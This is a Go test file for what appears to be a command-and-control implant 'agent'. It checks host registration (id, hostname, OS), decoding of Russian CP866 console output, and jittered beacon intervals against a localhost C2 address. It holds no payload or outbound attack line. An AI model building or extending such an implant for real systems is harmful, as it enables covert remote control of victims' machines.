package agent

import (
	"strings"
	"testing"
	"time"
)

func TestBuildRegistrationFormat(t *testing.T) {
	reg := buildRegistration()
	parts := strings.Split(reg, "|")
	if len(parts) != 3 {
		t.Fatalf("got %d parts, want 3: %q", len(parts), reg)
	}
	if parts[0] == "" {
		t.Error("id part is empty")
	}
	if parts[1] == "" {
		t.Error("hostname part is empty")
	}
	if parts[2] == "" {
		t.Error("os part is empty")
	}
}

func TestCp866ToUTF8ASCII(t *testing.T) {
	input := "hello"
	if got := cp866ToUTF8(input); got != input {
		t.Fatalf("got %q, want %q", got, input)
	}
}

func TestCp866ToUTF8CapitalA(t *testing.T) {
	// 0x80 = 'А' в CP866
	input := string([]byte{0x80})
	if got := cp866ToUTF8(input); got != "А" {
		t.Fatalf("got %q, want %q", got, "А")
	}
}

func TestCp866ToUTF8LowerR(t *testing.T) {
	// 0xE0 = 'р' в CP866
	input := string([]byte{0xE0})
	if got := cp866ToUTF8(input); got != "р" {
		t.Fatalf("got %q, want %q", got, "р")
	}
}

func TestCp866ToUTF8Mixed(t *testing.T) {
	// "ABC АБВ": A=0x41, B=0x42, C=0x43, space=0x20, А=0x80, Б=0x81, В=0x82
	input := string([]byte{0x41, 0x42, 0x43, 0x20, 0x80, 0x81, 0x82})
	want := "ABC АБВ"
	if got := cp866ToUTF8(input); got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestCp866ToUTF8WordFaylov(t *testing.T) {
	// "файлов" в CP866: ф=0xE4, а=0xA0, й=0xA9, л=0xAB, о=0xAE, в=0xA2
	input := string([]byte{0xE4, 0xA0, 0xA9, 0xAB, 0xAE, 0xA2})
	want := "файлов"
	if got := cp866ToUTF8(input); got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}

func TestNextPollIntervalWithinBounds(t *testing.T) {
	a := New(Config{
		C2Address: "127.0.0.1:445",
		PollMin:   2 * time.Second,
		PollMax:   5 * time.Second,
		Reconnect: 10 * time.Second,
	})
	for i := 0; i < 100; i++ {
		d := a.nextPollInterval()
		if d < 2*time.Second || d >= 5*time.Second {
			t.Fatalf("interval out of range: %v", d)
		}
	}
}

func TestNextPollIntervalEqualBounds(t *testing.T) {
	a := New(Config{
		C2Address: "127.0.0.1:445",
		PollMin:   3 * time.Second,
		PollMax:   3 * time.Second,
	})
	if got := a.nextPollInterval(); got != 3*time.Second {
		t.Fatalf("got %v, want 3s", got)
	}
}